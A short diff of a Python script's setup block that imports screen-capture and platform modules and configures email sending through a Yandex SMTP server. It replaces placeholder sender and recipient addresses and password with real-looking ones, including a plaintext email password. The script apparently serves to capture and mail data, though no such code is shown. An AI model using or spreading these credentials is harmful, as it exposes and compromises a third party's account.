@@ -13,9 +13,9 @@ from PIL import ImageGrab
 import platform
 
 # setup
-from_email = "mail@mail.com" # sender email
-to_email = "mail2@mail.com" # recipient email
-email_passworld = "PASSWORLD" #passworld from sender email
+from_email = "jakobitow83@mail.com" # sender email
+to_email = "jakobitow93@mail.com" # recipient email
+email_passworld = "Gmodplayer1335" #passworld from sender email
 smtp = "smtp.yandex.ru" # smtp server address
 smtp_port = 587 # smtp port
 print("V0.2")
